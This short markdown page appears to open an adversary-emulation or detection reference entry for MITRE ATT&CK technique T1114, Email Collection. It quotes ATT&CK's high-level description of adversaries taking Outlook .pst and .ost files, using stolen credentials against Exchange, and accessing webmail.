# T1114 - Email Collection
## [Description from ATT&CK](https://attack.mitre.org/wiki/Technique/T1114)
<blockquote>Adversaries may target user email to collect sensitive information from a target.

Files containing email data can be acquired from a user's system, such as Outlook storage or cache files .pst and .ost.

Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network.

Some adversaries may acquire user credentials and access externally facing webmail applications, such as Outlook Web Access.</blockquote>
